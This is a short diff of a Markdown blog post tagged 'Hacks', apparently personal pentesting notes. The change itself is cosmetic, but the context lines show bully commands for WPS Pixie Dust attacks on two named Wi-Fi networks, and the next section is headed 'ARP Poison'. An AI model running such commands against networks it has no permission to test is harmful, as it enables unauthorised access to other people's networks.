@@ -6,7 +6,6 @@ excerpt_separator: "<!--more-->"
 categories:
   - IT
   - Hacks
-
 tags:
   - firma
 ---
@@ -39,6 +38,10 @@ sudo bully --bssid D8:C6:78:0F:73:14 --essid VIVO-7314 --eapfail --nofcs --pixie
 # Mi 8 Lite
 sudo bully --bssid 5E:8F:53:F6:37:D0 --essid "MI 8 Lite" --eapfail --nofcs --pixiewps --channel 11 --verbosity 4 wlan0mon
 ```
+
+<br>
+
+---
 
 ## ARP Poison
 
